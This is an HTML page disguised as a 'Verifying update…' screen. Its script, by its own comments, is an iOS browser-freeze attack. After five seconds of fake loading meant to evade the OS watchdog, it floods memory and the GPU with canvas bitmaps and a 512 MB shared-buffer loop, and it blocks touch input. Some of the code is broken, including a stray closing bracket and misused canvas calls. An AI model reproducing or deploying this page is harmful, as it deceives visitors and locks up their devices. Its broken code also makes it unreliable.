<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifying update…</title>
    <style>
        body,html {margin:0;height:100%;overflow:hidden;background:#000}
        #c {position:fixed;inset:0;display:block}
    </style>
</head>
<body>
<canvas id="c"></canvas>
<script>
// iOS 26.0 – 26.1 FINAL FREEZE (Dec 2025) – bypasses runaway-tab protection
// Looks innocent for the first 4–6 seconds, then total lock in 12–18 seconds

const c = document.getElementById('c');
const ctx = c.getContext('2d', {alpha:false, desynchronized:false});
let w, h;

// 1. Stay under the radar for the first 5 seconds
setTimeout(startTheRealAttack, 5000);

function resize() {
    w = c.width = innerWidth * devicePixelRatio;
    h = c.height = innerHeight * devicePixelRatio;
}
resize();
addEventListener('resize', resize);

// Fake “loading” screen so Apple doesn’t kill it early
let dots = 0;
const loading = setInterval(() => {
    document.title = "Verifying update" + ".".repeat(dots++ % 4);
}, 400);

function startTheRealAttack() {
    clearInterval(loading);
    document.title = "";

    // 2. OffscreenCanvas + transferToImageBitmap flood (iOS 26 weak spot)
    function bitmapHell() {
        const off = new OffscreenCanvas(4096, 4096);
        const ox = off.getContext('2d');
        ox.fillStyle = `#${Math.random().toString(16).slice(2,8)}`;
        ox.fillRect(0,0,4096,4096);
        off.transferToImageBitmap().then(bmp => {
            ctx.transferFromImageBitmap(bmp);
            bitmapHell();
        });
    }

    // 3. Microtask + SharedArrayBuffer explosion
    const sab = new SharedArrayBuffer(1024 * 1024 * 512); // 512 MB
    const arr = new Uint32Array(sab);
    let idx = 0;
    function sabLoop() {
        Atomics.store(arr, idx % arr.length, Math.random() * 0xffffffff);
        idx++;
        queueMicrotask(sabLoop);
    }

    // 4. Final payload
    bitmapHell();
    sabLoop();
    setInterval(() => bitmapHell(), 1);

    // Hide everything from the watchdog
    history.pushState({},'',' ');
    ['touchmove','touchstart','gesturestart','gesturechange'].forEach(ev => {
        addEventListener(ev, e => e.preventDefault(), {passive:false, capture:true});
    });
    });
}
</script>
</body>
</html>
